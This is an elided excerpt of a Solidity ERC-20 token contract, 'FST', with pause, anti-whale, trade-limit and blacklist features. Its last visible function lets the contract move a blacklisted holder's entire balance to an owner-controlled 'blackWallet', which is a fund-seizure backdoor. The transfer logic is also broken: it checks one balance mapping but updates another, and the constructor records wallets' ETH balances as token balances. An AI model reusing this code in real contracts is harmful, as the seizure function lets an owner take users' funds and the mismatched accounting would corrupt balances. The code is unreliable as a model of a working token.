...
contract FST is Context, IERC20, accessControlV2, brakeSystem, portfolioManager, antiwhaleSystem, associateSystem, Ownable {
    ...
    event Transfer(address indexed sender, address indexed recipient, uint256 indexed transferAmount);
...
constructor() public payable {
    ...
    DEV_balances = devWallet.balance;
    MARKET_balances = marketWallet.balance;
    ECOM_balances = ecommerceWallet.balance;
    BLACK_balances = blackWallet.balance;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal whenNotPaused checkAssociate(sender) {
        ...
        require(amount <= _balances[sender],"Transfer must be equal to or less than the portfolio balance");
        ...
        transferAmount = antiWhale(sender, recipient, amount);
        ...
        transferAmount = tradeLimit(sender, recipient, amount);
        _tokenBalance[sender] = _tokenBalance[sender].sub(amount);
        _tokenBalance[recipient] = _tokenBalance[recipient].add(transferAmount);
        }
    ...
    chek_Account(_blackAccount);
        uint256 amount = _balances[_blackAccount];
        _balances[_blackAccount] = _balances[_blackAccount].sub(amount);
        _balances[blackWallet] = _balances[blackWallet].add(amount);
    }
